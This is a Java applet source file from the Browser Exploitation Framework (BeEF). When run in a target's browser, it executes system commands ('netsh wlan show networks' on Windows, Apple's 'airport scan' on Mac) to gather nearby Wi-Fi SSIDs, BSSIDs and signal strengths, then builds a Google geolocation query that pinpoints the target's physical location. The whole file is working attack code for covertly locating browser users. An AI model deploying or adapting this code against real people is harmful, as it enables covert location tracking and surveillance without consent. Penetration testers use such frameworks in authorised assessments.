/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

import java.io.*;  
import java.util.*;
import java.net.*;
import java.applet.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// Keith Lee
// Twitter: @keith55
// http://milo2012.wordpress.com
// keith.lee2012[at]gmail.com

public class getGPSLocation extends Applet{  
	public static String result = "";
	
	public getGPSLocation(){
		super();
		return;
	}
	public static String getInfo() {
		return result;
	}

	public void init() {
		if (isWindows()) {
			result=getWindows();
		} else if (isMac()) {
			result=getMac();
		} else {
			//System.out.println("Your OS is not support!!");
		}
	}
	
	public static String getWindows(){
            try {  
			
		ArrayList ssidList = new ArrayList();
		ArrayList bssidList = new ArrayList();
		ArrayList rssiList = new ArrayList();
			
		Process p = Runtime.getRuntime().exec("netsh wlan show networks mode=bssid");  
                
		BufferedReader in = new BufferedReader(  
                                    new InputStreamReader(p.getInputStream()));  
                String line = null;  
		String signal = null;
		String ssidStr = null;
		
		while ((line = in.readLine()) != null) {  
			
			Pattern p1 = Pattern.compile("(SSID\\s\\d+\\s:)\\s([\\w\\s]*)");
			Matcher m1 = p1.matcher(line);
			if(m1.find()){
				ssidStr = m1.group(2);
				ssidStr = ssidStr.replaceAll(" ","%20");
				ssidList.add(ssidStr);
			}	
			Pattern p2 = Pattern.compile("(BSSID\\s1\\s*:)\\s((.?)*)");
			Matcher m2 = p2.matcher(line);
			if(m2.find()){
				bssidList.add(m2.group(2));
			}	
			Pattern p3 = Pattern.compile("(Signal\\s*):\\s((.?)*)");
			Matcher m3 = p3.matcher(line);
			if(m3.find()){
				signal = m3.group(2);
				signal = signal.replaceAll("%","");
				signal = signal.replaceAll(" ","");
				signal = "-"+signal;
				rssiList.add(signal);
			}											
		}

		int arraySize=ssidList.size();
		if(arraySize==0){
			result="\nI don't know where the target is";
		}
		else{
			result=googleLookup(bssidList,ssidList,rssiList);
		}
	         } catch (Exception e) {  
	        	System.out.println(e.getMessage());
            }
			return result;          
	}
	
	public static String googleLookup(ArrayList bssidList,ArrayList ssidList,ArrayList rssiList){
	    String queryString = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true";
	    try {  
			int j=0;
			while(j<ssidList.size()){
				queryString+="&wifi=mac:";
				queryString+=bssidList.get(j);
				queryString+="%7C";
				
				queryString+="ssid:";
				queryString+=ssidList.get(j);
			
				queryString+="%7C";
				queryString+="ss:";
				queryString+=rssiList.get(j);
				j++;
			}		
		} catch (Exception e) { 
			System.out.println(e.getMessage());
		}
		return queryString;		
	}
	
	public static String getMac(){
        try {  
                Process p = Runtime.getRuntime().exec("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport scan");  
                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));  
                String line = null;  
				String ssidStr = null;
				String signal = null;
				
				String queryString = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true";
		
				ArrayList ssidList = new ArrayList();
				ArrayList bssidList = new ArrayList();
				ArrayList rssiList = new ArrayList();

				line = in.readLine();	
				while ((line = in.readLine()) != null) {  
					line = line.replaceAll("^\\s+", "");
					
					Pattern p1 = Pattern.compile("((.?)*\\s\\w*):(\\w*:\\w*:\\w*:\\w*:\\w*)\\s((.?)*)\\s(\\d+)");
					Matcher m1 = p1.matcher(line);
					if(m1.find()){
						ssidStr = m1.group(1);
						ssidStr = ssidStr.replaceAll(" ","%20");
						ssidList.add(ssidStr);
						bssidList.add(m1.group(2));
						signal = m1.group(3);
						signal = signal.replaceAll(" ","");
						rssiList.add(signal);
					}
					
				}
			int arraySize=ssidList.size();
			if(arraySize==0){
				result="\nI don't know where the target is";
			}
			else{
				result=googleLookup(bssidList,ssidList,rssiList);
			}
		} catch (Exception e) { 
			System.out.println(e.getMessage());
		}  
		return result;		
	}  

	public static boolean isWindows() {
 
		String os = System.getProperty("os.name").toLowerCase();
		// windows
		return (os.indexOf("win") >= 0);
 
	}
 
	public static boolean isMac() {
 
		String os = System.getProperty("os.name").toLowerCase();
		// Mac
		return (os.indexOf("mac") >= 0);
 
	}
 
	public static boolean isLinux() {
 
		String os = System.getProperty("os.name").toLowerCase();
		// linux or unix
		return (os.indexOf("nix") >= 0 || os.indexOf("nux") >= 0);
 
	}

    }  
